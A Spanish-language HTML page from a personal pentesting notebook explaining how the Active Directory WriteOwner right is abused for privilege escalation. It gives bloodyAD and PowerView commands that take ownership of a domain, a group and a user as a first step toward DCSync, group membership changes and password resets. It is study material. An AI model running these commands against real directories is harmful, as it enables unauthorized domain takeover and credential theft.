@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Write Owner | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="write-owner">
+          <div class="note-tabbar">
+            <span>Write Owner</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ACL</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / acl</p>
+            <h2>Write Owner</h2>
+
+            <p>WriteOwner permite tomar propiedad de un objeto y después modificar permisos para avanzar hacia control efectivo.</p>
+
+            <p><span class="notebook-review-note">Info: <code>WriteOwner</code>: Permite convertirnos en los dueños de un objeto y editar su <code>DACL</code> como si tuviéramos el privilegio <code>WriteDACL</code> sobre ese objeto</span></p>
+            <p><span class="notebook-review-note">Info: <code>WriteOwner</code> sobre <code>Dominio</code> (DCSync)</span></p>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># alvaro: Convertirse en propietario del dominio para poder modificar su DACL
+# Kali
+bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; set owner &#x27;DC=dominio,DC=local&#x27; &#x27;alvaro&#x27;
+# Windows
+. .\PowerView.ps1  
+Set-DomainObjectOwner -Identity &quot;DC=dominio,DC=local&quot; -OwnerIdentity &quot;alvaro&quot;
+
+# Ataque: Modificar DACL del dominio y otorgar derecho DCSync explicado en (WriteDACL sobre Dominio (`DCSync`))</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Info: <code>WriteOwner</code> sobre <code>Grupos</code> (WriteMembers)</span></p>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># alvaro: Convertirse en propietario del grupo IT-Admins para poder modificar su DACL
+# Kali
+bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; set owner &#x27;IT-Admins&#x27; &#x27;alvaro&#x27;
+# Windows
+. .\PowerView.ps1  
+Set-DomainObjectOwner -Identity &quot;IT-Admins&quot; -OwnerIdentity &quot;alvaro&quot;
+
+# Ataque: Modificar DACL del grupo IT-Admins y otorgar derecho WriteMember explicado en &quot;WriteDACL sobre Grupo &quot;IT-Admins&quot;(`WriteMembers`))</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Info: WriteOwner sobre Usuarios (<code>ResetPassword</code>/<code>ForceChangePassword</code>)</span></p>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># alvaro: Convertirse en propietario de lidia para poder modificar su DACL
+# Kali
+bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; set owner &#x27;lidia&#x27; &#x27;alvaro&#x27;
+# Windows
+. .\PowerView.ps1  
+Set-DomainObjectOwner -Identity &quot;lidia&quot; -OwnerIdentity &quot;alvaro&quot;
+
+# Ataque: Modificar DACL de lidia y otorgar derecho ResetPassword explicado en (WriteDACL sobre Usuario &quot;lidia&quot; (`ResetPassword`))</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>acl</span>
+              <span>writeowner</span>
+              <span>owneredit</span>
+              <span>bloodyad</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
